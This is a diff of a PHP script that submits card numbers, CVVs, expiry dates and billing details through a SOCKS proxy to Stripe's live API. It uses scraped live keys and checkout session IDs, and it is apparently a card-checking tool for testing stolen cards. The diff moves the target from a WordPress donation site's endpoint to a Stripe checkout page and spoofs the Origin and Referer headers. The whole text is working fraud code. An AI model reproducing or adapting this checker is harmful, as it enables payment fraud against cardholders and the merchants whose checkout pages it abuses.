@@ -185,16 +185,17 @@ $ch = curl_init();
 //////////======= Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $proxy);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
-curl_setopt($ch, CURLOPT_URL, 'https://iowamost.org/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=asp_pp_req_token&amount=50&curr=USD&product_id=2406&quantity=1&billing_details={"name":"'.$firstname.'+'.$lastname.'","email":"'.$email.'","address":{"line1":"'.$street.'","city":"'.$city.'","state":"'.$state.'","country":"US","postal_code":"'.$zip.'"}}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[email]='.$email.'&billing_details[address][country]=TH&guid=26eb3278-021a-4101-a75a-4b7c883a5cdb&muid=dea65f64-65ee-40ed-b424-b1d5ac82b4ad&sid=c0cc7beb-dc1f-49a2-af6a-72214e1709d7&key=pk_live_2qbpYYJrY01gwkZxc85US2MJ&payment_user_agent=stripe.js%2Fff7983d9%3B+stripe-js-v3%2Fff7983d9%3B+checkout');
 //// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
 $headers = array();
-$headers[] = 'Accept: */*';
-$headers[] = 'Accept-language: th,en-US;q=0.9,en;q=0.8';
+$headers[] = 'Host: api.stripe.com';
+$headers[] = 'Accept: application/json';
+$headers[] = 'Accept-language: en-US';
 $headers[] = 'Content-Type: application/x-www-form-urlencoded';
-$headers[] = 'Origin: https://iowamost.org';
-$headers[] = 'Referer: https://iowamost.org/?asp_action=show_pp&product_id=2406';
+$headers[] = 'Origin: https://checkout.stripe.com';
+$headers[] = 'Referer: https://checkout.stripe.com/pay/cs_live_I69iRnFFfpYmHSBAfI7JLNIvwupP020otgSO6DBKTU6yQwpkZ0B6FGm3';
 $headers[] = 'Sec-Fetch-Mode: cors';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
@@ -210,16 +211,16 @@ $ch = curl_init();
 //////////======= Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $proxy);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_1H2lYvFsQus2ukkyr98kQjl9/confirm');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/ppage_1H3megBr95lPUTnBr1nEjUvw/confirm');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'save_payment_method=true&setup_future_usage=off_session&receipt_email='.$email.'&payment_method_data[type]=card&payment_method_data[billing_details][name]='.$firstname.'+'.$lastname.'&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][city]='.$city.'&payment_method_data[billing_details][address][state]='.$state.'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=7c4fd8dc-4a0e-4451-9446-5511c3372563&payment_method_data[muid]=c166de9b-4692-456d-9511-8c28c41a9931&payment_method_data[sid]=94a4ae4a-3932-444d-a59b-f36396dd2705&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fcb4a2485%3B+stripe-js-v3%2Fcb4a2485&payment_method_data[time_on_page]=16673&payment_method_data[referrer]=https%3A%2F%2Fiowamost.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D2406&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_dJikV5lIc1aNxi7ejgHfXinW00C9eTXXv2&client_secret=pi_1H2lYvFsQus2ukkyr98kQjl9_secret_yiSj8IMMsb6e8XE3S6nGx0c4H');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=pm_1H3mfDBr95lPUTnBzejZulMa&key=pk_live_2qbpYYJrY01gwkZxc85US2MJ');
 //// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
 $headers = array();
 $headers[] = 'Accept: application/json';
 $headers[] = 'Host: api.stripe.com';
 $headers[] = 'Content-Type: application/x-www-form-urlencoded';
-$headers[] = 'Origin: https://js.stripe.com';
-$headers[] = 'Referer: https://js.stripe.com/v3/controller-4d6cb57062395cdaedb65051366140a7.html';
+$headers[] = 'Origin: https://checkout.stripe.com';
+$headers[] = 'Referer: https://checkout.stripe.com/pay/cs_live_I69iRnFFfpYmHSBAfI7JLNIvwupP020otgSO6DBKTU6yQwpkZ0B6FGm3';
 $headers[] = 'Sec-Fetch-Mode: cors';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
